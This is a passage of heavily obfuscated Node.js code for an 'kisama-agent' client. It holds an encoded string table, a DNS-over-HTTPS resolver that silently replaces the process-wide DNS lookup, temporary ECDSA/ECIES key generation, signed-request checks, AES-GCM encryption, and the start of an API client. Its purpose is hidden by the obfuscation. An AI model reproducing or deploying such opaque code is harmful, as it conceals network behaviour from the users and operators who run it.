        'zwrNzsbKAwqGBM90ihnLBMqGDgHLieHuvfaVmIbJBgLLBNqGChjLzMfJzq',
        'Dg90ywW',
        'wezrueK',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'vKXsDKm',
        'Dg9ju09tDhjPBMC',
        'z2v0uMvHBhrPBwvjBMzV',
        'q09ovfjptf9qvujmsunFs0vz',
        'vgLTzxn0yw1Wigv4CgLYzwq6igrPzMy9',
        'DMH0zuG',
        'qxncBLu',
        'uL9psW',
        'CxL3Bfy',
        'CMvHzhLtDgf0zq',
        'BKrPqva',
        'runNBgq',
        'y29UBG',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'CMvWB3j0u2H6ywW',
        'DhvUBMvSvxjS',
        'DMvYC2LVBG',
        'A25HBwvwywXPza',
        'rMzTB08',
        'x2fWCgvUzeXVzW',
        'uufpB0G',
        'jNr5Cgu9',
        'sxPfy0S',
        'ohWXoxWXm3WXmNWXn3WXnhWZFde1Fdb8mtf8mxW0Fdz8mNW1FdiWFdD8oxWXnNWXohWXma',
        'u0HqEwi',
        'rKrftuW',
        'v21PCMq',
        'teXyuwu',
        'z1rRqKm',
        'x2jHC2vPBMzVx2XVy2fSx3rPBwu',
        'Bw1cBhe',
        'D2L0AfrHC2TnzxrH',
        'Aw5MBW',
        'C2vJCMv0',
        'A3vIzwXLDa',
        'y3j5ChrV',
        'oNnJAgvTzq',
        'vNzcuey',
        'C3bSAwnL',
        'm3WYFdD8mxW0Fdz8mhW1',
        'CgfJA2v0ihrVBYbZBwfSBcbMB3iGAgvHzgvYihbYB3rLy3rPB24GC2fTCgXL',
        'AxnbCNjHEq',
        'runeu0fFufvcs0vzoIdMNkRORR7NVA7NJQ/LOOpLJ5JPH4/KUjtMLOFKU7yGA2v5CY9Hz2vUDf9Ly2rZyv9WDwiUCgvTios4JEwTMowCQa',
        'BwTKAxjtEw5J',
        'teXvBgi',
        'z2v0qxv0AfrHzW',
        'zxHWCG',
        'z29uvM8',
        'dqOncG',
        's1nHrey',
        'wxDsALm',
        'DgLTzw91De1Z',
        'svnWAK8',
        's0HjuNy',
        'wMPQreC',
        'D2vIC29JA2v0',
        'zu5PC0i',
        'ywvZlteYoc1Ny20',
        'ExDVBuK',
        'CNvSBhm',
        'tMv4DxmTuhL0Ag9U',
        'B0revva',
        'nxWWFdn8nNWXFdr8mG',
        'sunmD04',
        'BNPzt1u',
        'AxngAw5PDgu',
        'D09uthK',
        'BNfUAfm',
        'quvtievUy3j5ChqGrxjYB3i6ieTLEsbTDxn0igjLigv4ywn0BhKGmZiGyNL0zxmGzM9YieffuY0YntyU',
        'shr0Ce1LDgHVza',
        'AgfUzhnOywTLig1LC3nHz2u6ia',
        'uhrjugG',
        'sgTewhC',
        'ntjIyJGYnwnKyJy1',
        'u2Tjvfm',
        'EwzPCLi',
        'y0f0ALO',
        'z2v0t25LDgLTzuXVz3m',
        'zxjYB3i',
        'u2vJlvDLyLnVy2TLDc1wzxjZAw9UoIaXmW',
        'CxvLCNLbBgW',
        'p25HBwu9',
        'u0Dgsgi',
        'y3vYCMvUDeXVywq',
        'vMjLuu0',
        's01preu',
        'v2rvDwm',
        'x3n0yxr1C19JywnOzq',
        'DxrMltG',
        'Ahr0Chm6lY9HCgKUAxbPzNKUB3jN',
        'y3jVBNrHC2TZ',
        'AhvmCKS',
        'wg1RyLO',
        'C2HVCNqGq2fWj24GuhjVDg8GCMv0DxjU',
        '5A+g5PAh5A655zMO57Y65Bcrig5VBMnLl3rHzY9JAxbOzxj0zxH0iowTL+AUTq',
        'C2vUzfDPBMrVD1vWzgf0zq',
        'ywnJzxnZx2rLBMLLza',
        'zK1LC0S',
        're9Jz3i',
        'vxH6vhy',
        'DgvTCa',
        'Bw92zuzPBgvZ',
        'uKH3sfu',
        'CNvU',
        'zxrAzNO',
        'nde5ndmWna',
        'zxHL',
        'CxvPyYbKAxnJyxjKzwqG',
        'ywrKve4',
        'C2vYDMvxzwjZB2nRzxq',
        'q0TXugm',
        'ywnJzxb0u3rYzwfT',
        'y29UC3rHBNrZ',
        'z0jQqLe',
        'CgfYyw1Z',
        'x3nLBMrxzwXJB21L',
        'zwrNzsbJB25Uzwn0igzHAwXLza',
        'C3rHDhm',
        'Cg5cExrLCW',
        'ExjzDNy',
        'CMrLDG',
        't0LPrvy',
        'tvrMwNG',
        'vgvTCeTLEu1HBMfNzxiGAw5PDgLHBgL6zwq',
        'z2v0tg9Nu3vTBwfYEq',
        'EvrHtLe',
        'x3jLCxvLC3rLCG',
        'uufSzeu',
        'ywPrwgu',
        'ExjjBum',
        'CwTXweS',
        'y29UDhjVBa',
        'wKPgCLC',
        'AxneAxi',
        'sNfYzgq',
        'B3bLBG',
        'zMLU',
        'EgjrCK4',
        'sKHuuhO',
        'Axnjua',
        'C2vZC2LVBG',
        'z1zWCgS',
        'DgLTzq',
        'x2rVC0rHDgvuAw1L',
        'rNLRuxC',
        'x2zPBMLZAa',
        'D3neB3DUz3jHzgvuB2TLBG',
        'uf9trvjwrvjFvvvjrd0',
        'ENzrENy',
        'rhfLueW',
        'C2v0q3jVBLrHC2TZ',
        'zKnmBM4',
        '6k+35Rgc6lAf5PE2',
        'wMLWig5VDcbMB3vUzdOG',
        'z2v0q3jVBKXVz3m',
        'A1DItKS',
        'BxnNuMvZB2X2zxjZ',
        'vgr4vui',
        'EwrSz3O',
        'Aw52ywXPzcbiuefdsYbiDwzMBwfUihbHzgrPBMC',
        'x2DLDenVBMzPz1zHBhvL',
        'wKLqx01bwf9msvnururFrKLmrvm',
        'q2nktgG',
        'x2DYB3DxAw5KB3C',
        'D2vIC29JA2v0uhjVEhK',
        'n3WWFdeWFdeYFdv8mNW2FdL8mtf8mxWZFdH8na',
        'su5gtW',
        'B25LDgLTzq',
        'DhjHBNnJCMLWDa',
        'r3b0rxe',
        'vgTmwvq',
        'swjMAg0',
        'wfrmEKe',
        'wvvqrgm',
        'zuHuv3u',
        'tLHhthG',
        'y3vYBc84lJuUma',
        'sK9sDLe'
    ];
    a0a = function () {
        return kY;
    };
    return a0a();
}
class a0S {
    static [a0c4(0x3e7)] = 0x1e;
    static ['TTL_MAX'] = 0x258;
    static [a0c4(0x77e)] = 0x3c;
    static ['SERVER_BACKOFF'] = 0x3c;
    static ['WARN_INTERVAL'] = 0x12c;
    static [a0c4(0xb0c)];
    static [a0c4(0xc24)] = null;
    constructor(a = {}) {
        const cH = a0c4, b = (a[cH(0x8ba)] && a[cH(0x8ba)]['length'] ? a[cH(0x8ba)] : a0P[cH(0x829)])[cH(0x922)](c => String(c)[cH(0x7e4)]()[cH(0x1ad)](/\/+$/, ''))[cH(0xaf5)](Boolean);
        this[cH(0x8ba)] = b['length'] ? b : [...a0P[cH(0x829)]], this['timeoutMs'] = a[cH(0xb95)] || 0xbb8, this['queryFn'] = a[cH(0x9d9)] || ((c, d, f) => this[cH(0x6c5)](c, d, f)), this[cH(0x75d)] = new Map(), this[cH(0x814)] = new Map(), this[cH(0x310)] = this['servers'][cH(0x922)](() => 0x0), this[cH(0xd27)] = 0x0;
    }
    async ['resolve'](a, b) {
        const cI = a0c4, c = {
                'LJmTZ': function (j, k) {
                    return j === k;
                },
                'WXqJk': function (j, k) {
                    return j * k;
                },
                'arRxu': function (j, k) {
                    return j + k;
                },
                'XCRCs': function (j, k) {
                    return j + k;
                },
                'LXeOw': function (j, k) {
                    return j * k;
                },
                'yUJco': function (j, k) {
                    return j > k;
                }
            };
        b = b || 0x0;
        const d = a + '|' + b, f = Date[cI(0x2a3)](), g = this[cI(0x75d)]['get'](d);
        if (g && c[cI(0x629)](g[cI(0x4ed)], f))
            return g[cI(0x938)][cI(0xa40)]();
        const h = this[cI(0x814)]['get'](d);
        if (h)
            return h;
        const i = ((async () => {
            const cJ = cI, j = await this['queryAll'](a, b);
            if (c['LJmTZ'](j[cJ(0x8ab)], 'ok') && j[cJ(0x938)][cJ(0xcfc)]) {
                const k = c[cJ(0x9b9)](Math[cJ(0x61d)](Math[cJ(0x23e)](j[cJ(0x383)], a0S[cJ(0x3e7)]), a0S[cJ(0x60a)]), 0x3e8);
                return this['cache'][cJ(0x9fe)](d, {
                    'ips': j[cJ(0x938)]['slice'](),
                    'expire': c[cJ(0x25f)](Date[cJ(0x2a3)](), k)
                }), j[cJ(0x938)][cJ(0xa40)]();
            }
            if (j[cJ(0x8ab)] === cJ(0x373))
                return this[cJ(0x75d)][cJ(0x9fe)](d, {
                    'ips': [],
                    'expire': c[cJ(0x26d)](Date[cJ(0x2a3)](), c['LXeOw'](a0S[cJ(0x77e)], 0x3e8))
                }), [];
            return null;
        })());
        this[cI(0x814)][cI(0x9fe)](d, i);
        try {
            return await i;
        } finally {
            this['inflight'][cI(0xdab)](d);
        }
    }
    async [a0c4(0xbb2)](a, b) {
        const cK = a0c4, c = {
                'ZBvlZ': function (k, l) {
                    return k === l;
                },
                'MEXGo': cK(0x373),
                'fItvo': cK(0xbb0)
            }, d = [];
        if (b !== 0x6)
            d[cK(0x21f)]([
                0x1,
                0x4
            ]);
        if (b !== 0x4)
            d['push']([
                0x1c,
                0x6
            ]);
        const f = {
            0x4: [],
            0x6: []
        };
        let g = ![], h = ![], i = ![], j = a0S['TTL_MAX'];
        for (const [k, l] of d) {
            try {
                const m = await this[cK(0x7b8)](a, k);
                c[cK(0xa7d)](m[cK(0x8ab)], 'ok') && m[cK(0x938)]['length'] ? (g = !![], f[l] = m[cK(0x938)], j = Math[cK(0x61d)](j, m[cK(0x383)])) : h = !![];
            } catch (n) {
                i = !![];
            }
        }
        if (g)
            return {
                'status': 'ok',
                'ips': this[cK(0xc91)](f[0x6], f[0x4]),
                'ttl': j
            };
        if (h && !i)
            return {
                'status': c[cK(0x623)],
                'ips': [],
                'ttl': 0x0
            };
        return {
            'status': c[cK(0x24e)],
            'ips': [],
            'ttl': 0x0
        };
    }
    async ['queryOne'](a, b) {
        const cL = a0c4, c = {
                'yAPrO': function (f, g) {
                    return f < g;
                },
                'fFJzW': function (f, g) {
                    return f < g;
                },
                'KgbRH': function (f, g) {
                    return f * g;
                },
                'huLrK': function (f, g) {
                    return f === g;
                },
                'dCNDx': cL(0x373),
                'SlyuV': function (f, g) {
                    return f !== g;
                },
                'AsBnU': cL(0x36e),
                'Gxfyc': cL(0x1dc)
            }, d = a0S[cL(0x455)](a);
        for (let f = 0x0; c[cL(0xb14)](f, this['servers']['length']); f++) {
            if (c[cL(0x218)](Date[cL(0x2a3)](), this[cL(0x310)][f]))
                continue;
            let g;
            try {
                g = await this[cL(0x9d9)](this[cL(0x8ba)][f], d, b);
            } catch (l) {
                this['failUntil'][f] = Date['now']() + c[cL(0x72d)](a0S[cL(0xa12)], 0x3e8);
                continue;
            }
            const h = g && c[cL(0xbbd)](typeof g, cL(0xc4b)) ? g[cL(0x7de)] || 0x0 : 0x1;
            if (c[cL(0xbbd)](h, 0x3))
                return {
                    'status': c[cL(0x37f)],
                    'ips': [],
                    'ttl': 0x0
                };
            if (c[cL(0x243)](h, 0x0))
                continue;
            const j = [];
            let k = a0S[cL(0x60a)];
            for (const m of g[cL(0x99b)] || []) {
                if (!m || c[cL(0x243)](m[cL(0x221)], b))
                    continue;
                if (typeof m['data'] !== c[cL(0xb68)] || !a0S[cL(0x642)](m[cL(0x369)], b))
                    continue;
                j[cL(0x21f)](m['data']);
                const n = parseInt(m[cL(0x8ef)], 0xa);
                if (Number[cL(0xba3)](n))
                    k = Math[cL(0x61d)](k, n);
            }
            if (j[cL(0xcfc)])
                return {
                    'status': 'ok',
                    'ips': [...new Set(j)],
                    'ttl': k
                };
            return {
                'status': c[cL(0x37f)],
                'ips': [],
                'ttl': 0x0
            };
        }
        throw new Error(c[cL(0x2c0)]);
    }
    [a0c4(0x6c5)](a, b, c) {
        const cM = a0c4, d = {
                'hIsYO': function (f, g) {
                    return f !== g;
                },
                'WbWVC': function (f, g) {
                    return f(g);
                },
                'TIGAj': cM(0xb3a),
                'lVuOF': function (f, g) {
                    return f(g);
                },
                'LHllP': cM(0x1bc),
                'huGPw': cM(0x64e),
                'SLcAa': cM(0x65b),
                'XtRoT': 'timeout',
                'PGRxT': cM(0xbb0)
            };
        return new Promise((f, g) => {
            const cN = cM, h = {
                    'OEVmL': function (j, k) {
                        return d['lVuOF'](j, k);
                    },
                    'Lrpql': d[cN(0x548)]
                }, i = a0h[cN(0x98b)](a + cN(0xbb3) + encodeURIComponent(b) + cN(0xb77) + c, {
                    'method': d[cN(0x3c7)],
                    'timeout': this['timeoutMs'],
                    'headers': {
                        'accept': d[cN(0x4ab)],
                        'user-agent': 'kisama-agent/' + a0P[cN(0xc9f)]
                    }
                }, j => {
                    const cO = cN;
                    if (d[cO(0x862)](j[cO(0x5b8)], 0xc8)) {
                        j['resume'](), d[cO(0xa32)](g, new Error(cO(0x70c) + j[cO(0x5b8)]));
                        return;
                    }
                    const k = [];
                    j['on'](cO(0x369), l => k[cO(0x21f)](l)), j['on'](d['TIGAj'], () => {
                        const cP = cO;
                        try {
                            h[cP(0x9ae)](f, JSON[cP(0xcf1)](Buffer[cP(0x6ef)](k)['toString'](h[cP(0x54f)])));
                        } catch (l) {
                            g(l);
                        }
                    });
                });
            i['on'](d[cN(0xd21)], () => i[cN(0x4b0)](new Error('doh\x20timeout'))), i['on'](d[cN(0xc1b)], g), i['end']();
        });
    }
    [a0c4(0x507)](a) {
        const cQ = a0c4, b = {
                'VpACc': function (d, f) {
                    return d >= f;
                },
                'RHwHU': function (d, f) {
                    return d - f;
                },
                'YCRIQ': function (d, f) {
                    return d * f;
                }
            }, c = Date[cQ(0x2a3)]();
        b[cQ(0xa64)](b[cQ(0xbc8)](c, this[cQ(0xd27)]), b[cQ(0x4f1)](a0S[cQ(0xcab)], 0x3e8)) && (this[cQ(0xd27)] = c, a0D[cQ(0x782)](cQ(0x41b) + a + cQ(0xc78)));
    }
    [a0c4(0xc91)](a, b) {
        const cR = a0c4, c = [...new Set(a)], d = [...new Set(b)];
        if (!c['length'])
            return d;
        if (!d['length'])
            return c;
        return this[cR(0xafd)]() ? c['concat'](d) : d[cR(0x6ef)](c);
    }
    [a0c4(0xafd)]() {
        const cS = a0c4, a = { 'bcDBh': 'udp6' };
        if (a0S[cS(0xb0c)] === undefined)
            try {
                const b = a0R[cS(0xc93)](a[cS(0x77d)]);
                b[cS(0xd8e)](), a0S[cS(0xb0c)] = !![];
            } catch (c) {
                a0S[cS(0xb0c)] = ![];
            }
        return a0S['_ipv6Usable'];
    }
    static [a0c4(0x642)](a, b) {
        const cT = a0c4, c = {
                'MJtxA': function (d, f) {
                    return d === f;
                }
            };
        return c[cT(0xd16)](a0i['isIP'](a), b === 0x1 ? 0x4 : 0x6);
    }
    static ['toAscii'](a) {
        const cU = a0c4;
        if (/^[\x00-\x7F]*$/[cU(0x1d0)](a))
            return a;
        try {
            return new URL(cU(0x1e1) + a)['hostname'];
        } catch (b) {
            return a;
        }
    }
}
const a0T = a0Q[a0c4(0x996)];
function a0U(a, b) {
    const cV = a0c4, c = {
            'Nnwgn': cV(0x499),
            'BrhiN': function (f, g) {
                return f(g);
            },
            'DEsvM': function (f, g, h) {
                return f(g, h);
            },
            'fZmOU': function (f, g) {
                return f === g;
            },
            'XGivF': 'function',
            'zJVHt': function (f, g) {
                return f !== g;
            },
            'gGJqj': cV(0x36e),
            'CznXb': cV(0x575),
            'pfRJg': cV(0x9f7),
            'ZjSAj': function (f, g) {
                return f === g;
            },
            'vqwcv': 'IPv6',
            'sDWaf': cV(0x94f),
            'tkvZa': function (f, g) {
                return f !== g;
            },
            'CrhaF': 'number',
            'ygDnm': 'object'
        }, d = b || a0T;
    return function f(g, h, i) {
        const cW = cV, j = {
                'VteMG': cW(0x723),
                'kVbUf': c[cW(0x9e2)],
                'AWBpe': function (n, o) {
                    const cX = cW;
                    return c[cX(0xcf0)](n, o);
                },
                'lWQRu': function (n, o, p) {
                    const cY = cW;
                    return c[cY(0xc14)](n, o, p);
                }
            };
        c['fZmOU'](typeof h, c[cW(0x236)]) && (i = h, h = {});
        if (c[cW(0xd09)](typeof g, c[cW(0x67b)]) || !g || a0i[cW(0xbed)](g))
            return d[cW(0xc6a)](a0Q, g, h, i);
        const k = h || {};
        let l = typeof k === 'object' ? k['family'] || 0x0 : k || 0x0;
        if (c['fZmOU'](l, c[cW(0x262)]) || c[cW(0x2ae)](l, c['pfRJg']))
            l = 0x4;
        else {
            if (c[cW(0x696)](l, c[cW(0xd3c)]) || l === c[cW(0x8dc)])
                l = 0x6;
            else {
                if (c['tkvZa'](typeof l, c[cW(0x843)]))
                    l = 0x0;
            }
        }
        const m = typeof k === c[cW(0x96d)] && !!k[cW(0xd94)];
        a[cW(0xa50)](g, l)[cW(0xcb3)](n => {
            const cZ = cW;
            if (n === null)
                return a[cZ(0x507)](g), d[cZ(0xc6a)](a0Q, g, h, i);
            if (!n[cZ(0xcfc)]) {
                const o = new Error(cZ(0x467) + g + cZ(0x892));
                return o[cZ(0x415)] = j[cZ(0xdbf)], o[cZ(0x4ba)] = j[cZ(0x9c1)], o[cZ(0x3cc)] = g, j[cZ(0x7fc)](i, o);
            }
            m ? j['lWQRu'](i, null, n[cZ(0x922)](p => ({
                'address': p,
                'family': a0i[cZ(0xbed)](p)
            }))) : i(null, n[0x0], a0i[cZ(0xbed)](n[0x0]));
        })[cW(0x22d)](n => i(n || new Error('secure\x20dns\x20internal\x20error')));
    };
}
function a0V(a = null) {
    const d0 = a0c4, b = {
            'JrwdV': function (f, g) {
                return f(g);
            },
            'tmtUv': function (f, g) {
                return f === g;
            },
            'msuvd': function (f, g, h) {
                return f(g, h);
            }
        };
    if (a0S['_globalHook'])
        return a0S[d0(0xc24)];
    const c = b[d0(0x43e)](String, b[d0(0x56a)](a, null) ? a0P[d0(0xafc)] : a)[d0(0x7e4)]()['toLowerCase']();
    if (c !== 'on')
        return null;
    let d = null;
    return a0P[d0(0x6c3)] && (d = a0P[d0(0x6c3)][d0(0x3ff)](/[,\s]+/)[d0(0x922)](f => f['trim']())[d0(0xaf5)](Boolean)), a0S[d0(0xc24)] = new a0S({ 'servers': d }), a0Q[d0(0x996)] = b[d0(0x6b7)](a0U, a0S[d0(0xc24)], a0T), a0D[d0(0xb82)](d0(0x2ef) + a0S['_globalHook'][d0(0x8ba)][d0(0x6e5)](',\x20')), a0S[d0(0xc24)];
}
a0V();
class a0W {
    constructor() {
        const d1 = a0c4;
        this[d1(0xb11)] = null, this[d1(0x598)] = null;
    }
    [a0c4(0xdc4)](a) {
        const d2 = a0c4, b = { 'uXyXr': '1|2|4|0|3' }, c = b[d2(0x328)][d2(0x3ff)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                a0D[d2(0xb82)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id=' + this[d2(0xb11)][d2(0x721)] + d2(0x88b) + a + '\x20小时');
                continue;
            case '1':
                this['_expireCurrent']();
                continue;
            case '2':
                if (this[d2(0xb11)])
                    return this[d2(0xb11)];
                continue;
            case '3':
                return this['_key'];
            case '4':
                this[d2(0xb11)] = this[d2(0x4aa)](a);
                continue;
            }
            break;
        }
    }
    [a0c4(0x63b)]() {
        const d3 = a0c4;
        this[d3(0x76e)]();
        if (this[d3(0xb11)])
            return this[d3(0xb11)][d3(0x929)];
        return null;
    }
    ['getActiveEciesPub']() {
        const d4 = a0c4;
        this['_expireCurrent']();
        if (this[d4(0xb11)])
            return this[d4(0xb11)][d4(0xd1c)];
        return null;
    }
    ['_expireCurrent']() {
        const d5 = a0c4, a = {
                'algIo': function (b, c) {
                    return b === c;
                },
                'ebqbv': d5(0xacb)
            };
        if (this[d5(0xb11)] && this['_isExpired'](this[d5(0xb11)])) {
            const b = this['_key'][d5(0x721)];
            this[d5(0xb11)] = null, a0D['warn'](d5(0x7bc) + b);
            if (a['algIo'](typeof this[d5(0x598)], a['ebqbv']))
                try {
                    this[d5(0x598)]();
                } catch (c) {
                    a0D[d5(0xbb0)](d5(0x1e3) + c[d5(0x1f1)]);
                }
        }
    }
    ['_isExpired'](a) {
        const d6 = a0c4, b = {
                'dJEgd': function (c, d) {
                    return c >= d;
                }
            };
        return b[d6(0xcfa)](Math['floor'](Date[d6(0x2a3)]() / 0x3e8), a[d6(0x744)]);
    }
    [a0c4(0x4aa)](a) {
        const d7 = a0c4, b = {
                'TqueB': d7(0x960),
                'jJEvY': d7(0xa71),
                'AIlYy': d7(0x4e5),
                'IPkDG': d7(0x7c0),
                'vDQJz': d7(0x270),
                'fQSFG': function (o, p) {
                    return o - p;
                },
                'uVbwE': function (o, p) {
                    return o / p;
                },
                'asghb': d7(0xd47),
                'dBfTo': function (o, p) {
                    return o + p;
                },
                'rAwet': 'base64url',
                'ofJrP': d7(0x7be)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[d7(0x62c)]('ec', { 'namedCurve': b[d7(0x96c)] }), f = c[d7(0xd28)]({
                'type': b['jJEvY'],
                'format': b[d7(0x2e0)]
            }), g = d[d7(0xd28)]({
                'type': b['IPkDG'],
                'format': d7(0x4e5)
            }), h = a0k[d7(0xa8d)](0x20), i = Buffer[d7(0x581)](a0B[d7(0x5d9)](h, ![])), j = c['export']({ 'format': d7(0x40b) }), k = d[d7(0xd28)]({
                'type': b[d7(0x636)],
                'format': b[d7(0x36c)]
            }), l = k[d7(0xd15)](b[d7(0x2b9)](k['length'], 0x41)), m = Math[d7(0x5c2)](b[d7(0x752)](Date['now'](), 0x3e8)), n = a * 0xe10;
        return {
            'key_id': a0k[d7(0xa8d)](0x8)['toString'](b[d7(0xafa)]),
            'created_at': m,
            'expires_at': b['dBfTo'](m, n),
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h['toString']('hex'),
            'ecies_public_key': i[d7(0xa3c)](b[d7(0xafa)]),
            'ecdsa_private_hex': Buffer[d7(0x581)](j['d'], b[d7(0xa03)])[d7(0xa3c)](d7(0xd47)),
            'ecdsa_public_b64': Buffer[d7(0x581)](a0A[d7(0xab3)][d7(0x6e9)](l)[d7(0xc95)](!![]))[d7(0xa3c)]('base64'),
            'ecies_public_b64': Buffer[d7(0x581)](a0B['getPublicKey'](h, !![]))[d7(0xa3c)](b['ofJrP']),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0X {
    constructor(a, b) {
        const d8 = a0c4, c = {
                'hIwhT': d8(0x7be),
                'unSRT': function (d, f) {
                    return d(f);
                },
                'rDZoj': d8(0x40b)
            };
        this[d8(0x795)] = null, this[d8(0xae3)] = null;
        if (a)
            try {
                const d = a[d8(0x7e4)]();
                if (d[d8(0x6ec)]('-----BEGIN'))
                    this[d8(0x795)] = a0k[d8(0x955)](d);
                else {
                    const f = Buffer[d8(0x581)](d, c['hIwhT']), g = a0A[d8(0xab3)][d8(0x6e9)](f), h = g['toBytes'](![]), i = m => m[d8(0xa3c)]('base64')['replace'](/\+/g, '-')[d8(0x1ad)](/\//g, '_')['replace'](/=/g, ''), j = c[d8(0x651)](i, Buffer[d8(0x581)](h['slice'](0x1, 0x21))), k = i(Buffer[d8(0x581)](h[d8(0xa40)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': d8(0x859),
                            'x': j,
                            'y': k
                        };
                    this[d8(0x795)] = a0k[d8(0x955)]({
                        'key': l,
                        'format': c[d8(0x37a)]
                    });
                }
            } catch (m) {
                a0D[d8(0xbb0)](d8(0xd9b) + m['message']), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this[d8(0xae3)] = a0w[d8(0x6eb)](b['trim']());
            } catch (n) {
                a0D['warn']('⚠️\x20ECIES公钥解码失败:\x20' + n[d8(0x1f1)]);
            }
    }
    [a0c4(0xa62)](a, b, c, d, f, g, h = null) {
        const d9 = a0c4, i = {
                'ZuWHy': d9(0x256),
                'NvNmo': function (j, k) {
                    return j(k);
                },
                'mlHhr': function (j, k) {
                    return j / k;
                },
                'fMesK': function (j, k) {
                    return j > k;
                },
                'NqQwT': function (j, k) {
                    return j - k;
                },
                'ofNHk': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'wkmkS': d9(0x860)
            };
        if (!this[d9(0x795)])
            throw new Error(i['ZuWHy']);
        try {
            const j = i[d9(0x1c8)](parseInt, f), k = Math['floor'](i[d9(0x8d1)](Date[d9(0x2a3)](), 0x3e8));
            if (i[d9(0xbc3)](Math[d9(0x437)](k - j), a0P[d9(0xd81)]))
                throw new Error(d9(0xb66) + Math[d9(0x437)](i[d9(0x807)](k, j)) + d9(0x348) + a0P[d9(0xd81)] + 's');
            const l = i[d9(0x5ec)](a0Y, a, b, c, d, f);
            if (this[d9(0x805)](this[d9(0x795)], l, g))
                return d9(0x734);
            if (h && this[d9(0x805)](h, l, g))
                return d9(0xbc6);
            throw new Error(i[d9(0x6c2)]);
        } catch (m) {
            throw new Error(d9(0xc4c) + m[d9(0x1f1)]);
        }
    }
    ['_verifyWith'](a, b, c) {
        const da = a0c4, d = { 'BTPiI': da(0x9cd) };
        if (!a)
            return ![];
        try {
            const f = a0w['toByteArray'](c), g = a0k['createVerify'](d[da(0x5f6)]);
            return g[da(0x954)](b), g[da(0x7c5)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0c4(0x9eb)](a, b = null) {
        const db = a0c4, c = {
                'qQWoQ': db(0x2e1),
                'tRnxh': function (d, f, g) {
                    return d(f, g);
                },
                'xHqyN': db(0x7be)
            };
        if (a0P[db(0x708)])
            return JSON['stringify'](a);
        if (!this[db(0xae3)])
            throw new Error(c[db(0x55c)]);
        try {
            const d = JSON['stringify'](a), f = Buffer[db(0x581)](d, db(0xbba)), g = b || Buffer[db(0x581)](this[db(0xae3)]), h = c[db(0x997)](a0v, g, f);
            return Buffer['from'](h)[db(0xa3c)](c[db(0x9f5)]);
        } catch (i) {
            throw new Error(db(0x6df) + i[db(0x1f1)]);
        }
    }
    [a0c4(0xb53)](a, b) {
        const dc = a0c4, c = {
                'Wmird': function (d, f) {
                    return d !== f;
                },
                'yWLrZ': 'AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.',
                'XTLzA': dc(0x7be),
                'XbqMQ': dc(0x1bc),
                'TqZQD': 'Missing\x20required\x20AES-GCM\x20fields\x20(nonce,\x20tag,\x20ciphertext)\x20in\x20payload.',
                'INnbU': 'aes-256-gcm'
            };
        if (!b || c[dc(0xb7c)](b[dc(0xcfc)], 0x20))
            throw new Error(c[dc(0x794)]);
        try {
            const d = Buffer[dc(0x581)](a, c[dc(0xc0e)])['toString'](c['XbqMQ']), f = JSON[dc(0xcf1)](d);
            if (!f[dc(0xadd)] || !f[dc(0x591)] || !f[dc(0x8e8)])
                throw new Error(c[dc(0x733)]);
            const g = Buffer[dc(0x581)](f[dc(0xadd)], c[dc(0xc0e)]), h = Buffer['from'](f[dc(0x591)], c[dc(0xc0e)]), i = Buffer[dc(0x581)](f['ciphertext'], c[dc(0xc0e)]), j = a0k[dc(0x54c)](c[dc(0x296)], b, g);
            j['setAuthTag'](h);
            let k = j['update'](i, null, c[dc(0xc96)]);
            return k += j[dc(0x6c9)](c[dc(0xc96)]), k;
        } catch (l) {
            throw new Error(dc(0x7a0) + l['message']);
        }
    }
    [a0c4(0x872)](a, b) {
        const dd = a0c4, c = {
                'Bnsmv': function (d, f) {
                    return d !== f;
                },
                'uLwRt': dd(0xba6),
                'pKGdm': dd(0x6a8),
                'sgZme': 'base64',
                'CDfDt': dd(0x1bc)
            };
        if (!b || c[dd(0xc7c)](b[dd(0xcfc)], 0x20))
            throw new Error(c[dd(0x9af)]);
        try {
            const d = a0k[dd(0xa8d)](0xc), f = a0k[dd(0x512)](c[dd(0x1a6)], b, d), g = Buffer[dd(0x6ef)]([
                    f[dd(0x954)](a),
                    f[dd(0x6c9)]()
                ]), h = f[dd(0xb8f)](), i = {
                    'nonce': d[dd(0xa3c)](c[dd(0x3e0)]),
                    'tag': h[dd(0xa3c)](c[dd(0x3e0)]),
                    'ciphertext': g[dd(0xa3c)](c[dd(0x3e0)])
                };
            return Buffer[dd(0x581)](JSON['stringify'](i), c[dd(0x1c3)])[dd(0xa3c)](dd(0x7be));
        } catch (j) {
            throw new Error(dd(0x826) + j[dd(0x1f1)]);
        }
    }
}
function a0Y(a, b, c, d, f) {
    const de = a0c4, g = {
            'zRYHy': de(0x385),
            'unBQU': de(0xd47)
        };
    return !c && (c = a0k[de(0x631)](g[de(0x27f)])[de(0x954)](Buffer['alloc'](0x0))[de(0x3a0)](g['unBQU'])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0Z(a, b = null) {
    const df = a0c4, c = {
            'QQbpO': df(0xc85),
            'CaFBE': df(0x8a8),
            'YPszR': df(0x3b2),
            'bqZIY': 'Content-Type',
            'jbcaX': df(0x833),
            'LWIqR': function (d, f) {
                return d === f;
            },
            'fMbPW': 'string',
            'FwuEx': df(0xbc6),
            'pjogn': function (d, f) {
                return d === f;
            },
            'BQOvT': 'utf8',
            'eByLd': df(0x8da),
            'lCwdc': function (d) {
                return d();
            },
            'JTXNi': df(0xac3),
            'UMBJy': df(0xc66),
            'AEVvZ': '/api/baseinfo',
            'WItOT': df(0xb1c),
            'lYJPf': function (d) {
                return d();
            },
            'lPJph': 'x-nonce',
            'XbIKi': df(0x1ba),
            'KytDo': 'x-timestamp',
            'JLXbs': df(0x8d0),
            'sJnfR': df(0x362),
            'orqaR': df(0x94c),
            'EVbKG': function (d) {
                return d();
            },
            'qFomT': df(0xa2c),
